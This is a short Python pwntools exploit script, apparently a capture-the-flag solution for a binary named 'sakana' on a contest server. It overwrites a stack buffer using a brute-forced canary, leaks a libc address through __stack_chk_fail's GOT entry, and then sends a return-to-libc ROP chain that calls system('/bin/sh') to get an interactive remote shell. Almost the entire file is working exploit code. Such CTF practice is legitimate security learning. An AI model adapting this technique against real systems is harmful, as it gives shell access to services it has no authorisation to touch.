
from pwn import *

import symbol


libc=ELF('pwn/sakana/libc-2.31.so')
elf=context.binary=ELF('pwn/sakana/sakana')
r=remote('ctf.adl.tw',10003)



pop_rdi=0x00000000000023a3#found in binary by ropper
ret=0x000000000000101a#also found by ropper, for stack alignment

canary=b'\x0a\x00\x00\x00\x00\x00\x00\x00'#I found the canary by brute force in guess.py

#the 1st payload finds the libc base address

r.sendline(b'printf')
r.sendline(b'A'*263+B'B'+canary+8*b'a'+flat(elf.got.__stack_chk_fail,elf.plt.__stack_chk_fail))
r.recvlines(20)
got__stack_chk_fail=unpack(r.recvline()[:6].ljust(8,b'\x00'))
print('leaked got got__stack_chk_fail: %x'%got__stack_chk_fail)
libc.address=got__stack_chk_fail-libc.symbols.__stack_chk_fail
print('libc base %x'%libc.address)

#the 2nd payload opens the bin/sh


r.sendline(b'printf')
r.sendline(b'A'*264+canary+8*b'a'+flat(pop_rdi,next(libc.search(b'/bin/sh\x00')),ret,libc.symbols.system))
r.interactive()
r.close()